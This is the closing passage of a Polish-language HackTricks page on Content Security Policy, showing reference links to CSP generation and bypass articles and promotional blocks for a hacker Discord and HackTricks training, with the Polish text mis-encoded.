[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## OdwoÅ‚ania

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**WglÄ…d w hakerstwo**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci na Å¼ywo z hakerstwa**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dom

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i waÅ¼nymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
